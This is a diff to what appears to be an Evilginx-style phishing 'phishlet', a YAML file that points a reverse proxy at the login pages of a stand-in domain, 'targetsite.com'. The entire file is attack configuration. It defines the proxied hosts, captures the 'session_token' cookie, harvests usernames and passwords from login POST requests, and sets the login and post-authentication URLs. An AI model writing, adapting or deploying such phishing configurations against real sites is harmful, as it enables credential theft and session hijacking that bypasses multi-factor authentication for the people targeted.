@@ -2,11 +2,12 @@ author: '@villaroot'
 min_ver: '2.3.0'
 
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'realSite.com', session: true, is_landing: true}
-  - {phish_sub: '', orig_sub: '', domain: 'realSite.com', session: true, is_landing: false}
-sub_filters: []
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'targetsite.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'targetsite.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'login.targetsite.com', orig_sub: 'login', domain: 'targetsite.com', search: 'https://{hostname}/login.php', replace: 'https://{hostname}/login.php', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
 auth_tokens:
-  - domain: 'login.realSite.com'
+  - domain: 'login.targetsite.com'
     keys: ['session_token']
 credentials:
   username:
@@ -17,6 +18,8 @@ credentials:
     key: 'password'
     search: '(.*)'
     type: 'post'
+auth_urls:
+  - '/dashboard.php'
 login:
-  domain: 'login.realSite.com'
-  path: '/dashboard.php'
+  domain: 'login.targetsite.com'
+  path: '/login.php'
